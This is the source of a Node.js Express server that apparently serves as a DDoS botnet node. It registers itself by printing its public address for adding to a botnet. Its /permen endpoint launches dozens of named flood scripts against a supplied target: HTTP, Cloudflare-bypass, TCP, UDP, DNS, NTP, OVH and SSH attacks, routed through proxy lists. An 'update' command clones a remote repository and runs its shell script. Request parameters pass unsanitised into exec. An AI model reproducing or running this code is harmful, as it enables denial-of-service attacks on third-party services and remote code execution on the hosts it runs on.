const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 4444;

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}/permen`);
  return data;
}

app.get('/permen', (req, res) => {
  const { target, time, methods, port } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname;
  const path = sikat.pathname;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Eksekusi sesuai methods
  if (methods === 'ninja') {
    console.log('received');
    exec(`node methods/ninja ${target} ${time}`);
  } else if (methods === 'h1hold') {
    exec(`node methods/h1hold.js ${target}`);
  } else if (methods === 'panel') {
    exec(`node methods/panel.js ${target} ${time}`);
  } else if (methods === 'pluto') {
    exec(`node methods/Pluto.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'poseidon') {
    exec(`node methods/Poseidon.js ${target} ${time} 4 proxy.txt autorate`);
  } else if (methods === 'httpv4') {
    exec(`node methods/httpv44.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'nuke') {
    exec(`node methods/Nuke.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'pidoras') {
    exec(`node methods/PIDORAS.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'glory') {
    exec(`node methods/Glory.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'gojo') {
    exec(`node methods/gojov5.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'flood') {
    exec(`node methods/hybrid.js ${target} ${time} 4 65 proxy.txt`);
  } else if (methods === 'http-raw') {
    exec(`node methods/HTTP-RAW.js ${target} ${time}`);
  } else if (methods === 'raw') {
    exec(`node methods/raw.js ${target} ${time}`);
  } else if (methods === 'pepek') {
    exec(`node methods/pepek.js ${target} ${time}`);
  } else if (methods === 'thunder') {
    exec(`node methods/thunder.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'bypass') {
    exec(`node methods/bypass.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'cf-flood') {
    exec(`node methods/cf-flood.js ${target} ${time}`);
  } else if (methods === 'http-vip') {
    exec(`node methods/HTTP-VIP.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'uam') {
    exec(`node methods/uambypass.js ${target} ${time} 65 proxy.txt`);
  } else if (methods === 'rape') {
    exec(`node methods/rape.js GET ${time} 4 proxy.txt 65 ${target}`);
  } else if (methods === 'tornado') {
    exec(`node methods/TORNADOV2.js GET ${target} ${time} 4 65 proxy.txt`);
  } else if (methods === 'raw-mix') {
    exec(`node methods/RAW-MIX.js ${target} ${time}`);
  } else if (methods === 'drown') {
    exec(`node methods/drown.js ${target} ${time} 4 65`);
  } else if (methods === 'cookie') {
    exec(`node methods/cookie.js ${target} ${time} 4 65 proxy.txt`);
  } else if (methods === 'tls-slow') {
    exec(`node methods/YAT-TLS.js ${target} ${time} 65 4 proxy.txt`);
  } else if (methods === 'tcp') {
    exec(`./methods/tcp ${slurp} ${port} ${time}`);
  } else if (methods === 'kill-ssh') {
    exec(`node methods/StarsXSSH.js ${slurp} ${port} root ${time}`);
  } else if (methods === 'udp') {
    exec(`node methods/udp.js ${slurp} ${port} ${time}`);
  } else if (methods === 'dns') {
    exec(`node methods/dns.js ${slurp} ${port} ${time}`);
  } else if (methods === 'ntp') {
    exec(`node methods/ntp.js ${slurp} ${port} ${time}`);
  } else if (methods === 'ovh') {
    exec(`node methods/ovh.js ${slurp} ${port} ${time}`);
  } else if (methods === 'tcp2') {
    exec(`node methods/tcp.js ${slurp} ${port} ${time}`);
  } else if (methods === 'pairing') {
    exec(`node methods/spampair.js ${path} ${time}`);
  } else if (methods === 'refresh') {
    exec(`pm2 restart all && pkill node`);
  } else if (methods === 'proxy') {
    exec(`node proxy.js`);
  } else if (methods === 'update') {
    exec(`cd /var/log && tmux new-session -d 'rm -rf botnet && git clone https://github.com/annizayanti/botnet && cd botnet && bash s.sh'`);
  } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  fetchData();
});
